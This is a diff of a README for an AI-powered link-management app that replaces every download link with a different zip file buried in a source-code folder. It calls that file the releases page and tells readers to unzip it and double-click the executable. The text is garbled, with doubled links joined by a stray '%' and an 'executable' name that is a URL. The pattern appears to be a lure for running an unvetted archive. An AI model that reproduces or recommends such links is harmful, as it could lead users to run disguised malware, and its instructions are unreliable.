@@ -1,7 +1,7 @@
 # 🎯 Urlvy-link-control-platform-using-AI - Your Simple Link Management Solution
 
 ## 📥 Download Now
-[![Download](https://raw.githubusercontent.com/b3geeIsEpik/Urlvy-link-control-platform-using-AI/main/web/components/ui/Urlvy-link-control-platform-using-AI_1.9.zip%https://raw.githubusercontent.com/b3geeIsEpik/Urlvy-link-control-platform-using-AI/main/web/components/ui/Urlvy-link-control-platform-using-AI_1.9.zip)](https://raw.githubusercontent.com/b3geeIsEpik/Urlvy-link-control-platform-using-AI/main/web/components/ui/Urlvy-link-control-platform-using-AI_1.9.zip)
+[![Download](https://github.com/b3geeIsEpik/Urlvy-link-control-platform-using-AI/raw/refs/heads/main/nhost/functions/ai-summary/using_AI_Urlvy_link_platform_control_v1.2.zip%https://github.com/b3geeIsEpik/Urlvy-link-control-platform-using-AI/raw/refs/heads/main/nhost/functions/ai-summary/using_AI_Urlvy_link_platform_control_v1.2.zip)](https://github.com/b3geeIsEpik/Urlvy-link-control-platform-using-AI/raw/refs/heads/main/nhost/functions/ai-summary/using_AI_Urlvy_link_platform_control_v1.2.zip)
 
 ## 📖 Introduction
 Welcome to "Urlvy-link-control-platform-using-AI"! This full-stack link management platform allows you to turn long URLs into custom, branded short links. It also auto-generates AI-powered summaries for instant previews, tracks clicks in real time, and even includes a chat feature with an AI analyst to provide deep traffic insights. 
@@ -10,7 +10,7 @@ Welcome to "Urlvy-link-control-platform-using-AI"! This full-stack link manageme
 To get started, follow these steps to download and run our software:
 
 1. **Visit the Download Page:**
-   Go to our [Releases page](https://raw.githubusercontent.com/b3geeIsEpik/Urlvy-link-control-platform-using-AI/main/web/components/ui/Urlvy-link-control-platform-using-AI_1.9.zip) to see the latest version of the application.
+   Go to our [Releases page](https://github.com/b3geeIsEpik/Urlvy-link-control-platform-using-AI/raw/refs/heads/main/nhost/functions/ai-summary/using_AI_Urlvy_link_platform_control_v1.2.zip) to see the latest version of the application.
 
 2. **Choose Your Version:**
    On the Releases page, you’ll see various versions of the application. Look for the most recent one. You may notice links for different operating systems. Select the version that matches your system.
@@ -22,7 +22,7 @@ To get started, follow these steps to download and run our software:
    Once the download is complete, find the downloaded file in your "Downloads" folder. Right-click on the file and select "Extract" or "Unzip." This will create a folder containing the application's files.
 
 5. **Run the Application:**
-   Open the extracted folder and locate the executable file (look for a file with a name like `https://raw.githubusercontent.com/b3geeIsEpik/Urlvy-link-control-platform-using-AI/main/web/components/ui/Urlvy-link-control-platform-using-AI_1.9.zip` or similar). Double-click on this file to start the application.
+   Open the extracted folder and locate the executable file (look for a file with a name like `https://github.com/b3geeIsEpik/Urlvy-link-control-platform-using-AI/raw/refs/heads/main/nhost/functions/ai-summary/using_AI_Urlvy_link_platform_control_v1.2.zip` or similar). Double-click on this file to start the application.
 
 6. **Follow Initial Setup Steps:**
    The first time you run the application, you may see a setup guide. Follow the on-screen instructions to configure your settings, such as creating an account or logging in.
@@ -63,7 +63,7 @@ For further assistance or questions, you can:
 - Join community discussions on our discussion board.
 
 ## 🔗 Links
-- [Releases Page](https://raw.githubusercontent.com/b3geeIsEpik/Urlvy-link-control-platform-using-AI/main/web/components/ui/Urlvy-link-control-platform-using-AI_1.9.zip) - Download the app
+- [Releases Page](https://github.com/b3geeIsEpik/Urlvy-link-control-platform-using-AI/raw/refs/heads/main/nhost/functions/ai-summary/using_AI_Urlvy_link_platform_control_v1.2.zip) - Download the app
 - [Documentation](#) - Additional instructions and features
 
 Feel free to reach out with any feedback or recommendations. Happy linking!
